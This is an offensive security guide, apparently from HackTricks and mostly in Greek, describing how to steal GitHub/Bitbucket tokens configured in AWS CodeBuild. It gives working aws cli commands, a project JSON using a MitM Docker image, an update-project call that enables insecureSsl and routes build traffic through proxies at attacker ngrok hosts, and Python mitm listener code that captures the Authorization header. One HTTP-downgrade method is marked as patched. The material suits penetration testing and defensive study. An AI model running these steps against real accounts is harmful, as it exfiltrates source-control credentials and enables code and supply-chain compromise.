# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Ανάκτηση Ρυθμισμένων Tokens Github/Bitbucket

Πρώτα, ελέγξτε αν υπάρχουν οποιαδήποτε διαπιστευτήρια πηγής ρυθμισμένα που θα μπορούσατε να διαρρεύσετε:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

Αν διαπιστώσετε ότι η αυθεντικοποίηση για παράδειγμα στο Github είναι ρυθμισμένη στον λογαριασμό, μπορείτε να **exfiltrate** αυτήν την **access** (**GH token ή OAuth token**) κάνοντάς το Codebuild να **χρησιμοποιήσει μια συγκεκριμένη εικόνα docker** για να εκτελέσει την κατασκευή του έργου.

Για αυτόν τον σκοπό μπορείτε να **δημιουργήσετε ένα νέο έργο Codebuild** ή να αλλάξετε το **περιβάλλον** ενός υπάρχοντος για να ρυθμίσετε την **εικόνα Docker**.

Η εικόνα Docker που μπορείτε να χρησιμοποιήσετε είναι [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Αυτή είναι μια πολύ βασική εικόνα Docker που θα ρυθμίσει τις **env μεταβλητές `https_proxy`**, **`http_proxy`** και **`SSL_CERT_FILE`**. Αυτό θα σας επιτρέψει να παγιδεύσετε το μεγαλύτερο μέρος της κίνησης του host που υποδεικνύεται στο **`https_proxy`** και **`http_proxy`** και να εμπιστευτείτε το SSL CERT που υποδεικνύεται στο **`SSL_CERT_FILE`**.

1. **Create & Upload your own Docker MitM image**
- Ακολουθήστε τις οδηγίες του repo για να ρυθμίσετε τη διεύθυνση IP του proxy σας και να ρυθμίσετε το SSL cert και **build the docker image**.
- **DO NOT SET `http_proxy`** για να μην παγιδεύσετε αιτήματα προς το metadata endpoint.
- Μπορείτε να χρησιμοποιήσετε **`ngrok`** όπως `ngrok tcp 4444` για να ρυθμίσετε το proxy στον host σας.
- Μόλις έχετε κατασκευάσει την εικόνα Docker, **upload it to a public repo** (Dockerhub, ECR...)
2. **Set the environment**
- Δημιουργήστε ένα **νέο έργο Codebuild** ή **τροποποιήστε** το περιβάλλον ενός υπάρχοντος.
- Ρυθμίστε το έργο να χρησιμοποιεί την **προηγουμένως παραγόμενη εικόνα Docker**.

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Set the MitM proxy in your host**

- Όπως υποδεικνύεται στο **Github repo** μπορείτε να χρησιμοποιήσετε κάτι σαν:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> Η **έκδοση mitmproxy που χρησιμοποιήθηκε ήταν 9.0.1**, αναφέρθηκε ότι με την έκδοση 10 αυτό μπορεί να μην λειτουργήσει.

4. **Εκτέλεση της κατασκευής & καταγραφή των διαπιστευτηρίων**

- Μπορείτε να δείτε το token στην κεφαλίδα **Authorization**:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

Αυτό θα μπορούσε επίσης να γίνει από το aws cli με κάτι σαν
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### Via insecureSSL

**Codebuild** projects have a setting called **`insecureSsl`** that is hidden in the web you can only change it from the API.\
Ενεργοποιώντας αυτό, επιτρέπει στο Codebuild να συνδεθεί με το αποθετήριο **χωρίς να ελέγχει το πιστοποιητικό** που προσφέρεται από την πλατφόρμα.

- First you need to enumerate the current configuration with something like:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- Στη συνέχεια, με τις συγκεντρωμένες πληροφορίες μπορείτε να ενημερώσετε τις ρυθμίσεις του έργου **`insecureSsl`** σε **`True`**. Ακολουθεί ένα παράδειγμα της ενημέρωσής μου για ένα έργο, παρατηρήστε το **`insecureSsl=True`** στο τέλος (αυτό είναι το μόνο που χρειάζεται να αλλάξετε από τη συγκεντρωμένη διαμόρφωση).
- Επιπλέον, προσθέστε επίσης τις μεταβλητές περιβάλλοντος **http_proxy** και **https_proxy** που δείχνουν στο tcp ngrok σας όπως:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- Στη συνέχεια, εκτελέστε το βασικό παράδειγμα από [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) στην θύρα που υποδεικνύεται από τις μεταβλητές proxy (http_proxy και https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Τέλος, κάντε κλικ στο **Build the project**, τα **credentials** θα σταλούν σε **καθαρό κείμενο** (base64) στη θύρα mitm:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~Via HTTP protocol~~

> [!TIP] > **Αυτή η ευπάθεια διορθώθηκε από την AWS κάποια στιγμή την εβδομάδα της 20ης Φεβρουαρίου 2023 (νομίζω την Παρασκευή). Έτσι, ένας επιτιθέμενος δεν μπορεί να την εκμεταλλευτεί πια :)**

Ένας επιτιθέμενος με **υψηλά δικαιώματα σε έναν CodeBuild θα μπορούσε να διαρρεύσει το token Github/Bitbucket** που έχει ρυθμιστεί ή αν τα δικαιώματα έχουν ρυθμιστεί μέσω OAuth, το ** προσωρινό OAuth token που χρησιμοποιείται για την πρόσβαση στον κώδικα**.

- Ένας επιτιθέμενος θα μπορούσε να προσθέσει τις μεταβλητές περιβάλλοντος **http_proxy** και **https_proxy** στο έργο CodeBuild που να δείχνουν στη μηχανή του (για παράδειγμα `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- Στη συνέχεια, αλλάξτε τη διεύθυνση URL του αποθετηρίου github για να χρησιμοποιεί HTTP αντί για HTTPS, για παράδειγμα: `http://github.com/carlospolop-forks/TestActions`
- Στη συνέχεια, εκτελέστε το βασικό παράδειγμα από [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) στη θύρα που υποδεικνύεται από τις μεταβλητές proxy (http_proxy και https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Στη συνέχεια, κάντε κλικ στο **Build the project** ή ξεκινήστε την κατασκευή από τη γραμμή εντολών:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Τέλος, τα **credentials** θα σταλούν σε καθαρό κείμενο (base64) στη θύρα mitm:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> Τώρα ένας επιτιθέμενος θα μπορεί να χρησιμοποιήσει το token από τη μηχανή του, να καταγράψει όλα τα δικαιώματα που έχει και να (κατα)χρησιμοποιήσει πιο εύκολα από το να χρησιμοποιήσει απευθείας την υπηρεσία CodeBuild.

{{#include ../../../../banners/hacktricks-training.md}}
